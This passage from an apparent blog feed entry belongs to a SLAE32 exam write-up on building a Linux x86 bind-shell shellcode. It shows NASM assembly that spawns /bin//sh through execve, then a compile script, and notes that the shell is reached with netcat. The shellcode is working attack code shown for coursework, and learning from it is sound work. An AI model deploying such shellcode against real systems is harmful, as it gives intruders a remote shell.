+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; Push the 0x00000000 on the stack
+xor eax, eax
+push eax
+; put the string on the stack
+push 0x68732f2f
+push 0x6e69622f
+; setup EBX with the vlue of ESP
+mov ebx, esp
+; set up EDX and push null bytes again
+push eax
+mov edx, esp
+; set up ECX argv address on the first dw and null in second dw
+push ebx 
+; Then move the top of the stack into ECX
+mov ecx, esp
+; EAX
+mov al, 0xb
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;-compilation-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Compilation &lt;/span&gt;&lt;/h3&gt;
+
+&lt;p&gt;Then we compiled the code with the following python script :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/bindshell# cat ../compile.sh 
+#! /bin/bash
+
+echo &apos;[+] Assembling with NASM&apos;
+nasm -f elf -o $1.o $1.nasm
+
+echo &apos;[+] Linking ..&apos;
+ld -m elf_i386 $1.o -o $1
+
+echo &apos;[+] Done!&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And finally, we launch the bind shellcode and connect to it with the netcat tool.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment1/assess1-result.PNG&quot; alt=&quot;drawing&quot; style=&quot;max-width:100%;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Create a Shell_Bind_TCP Shellcode: Binds to a port; Execs Shell on incoming connection; Port should be easily configurable.</summary></entry></feed>
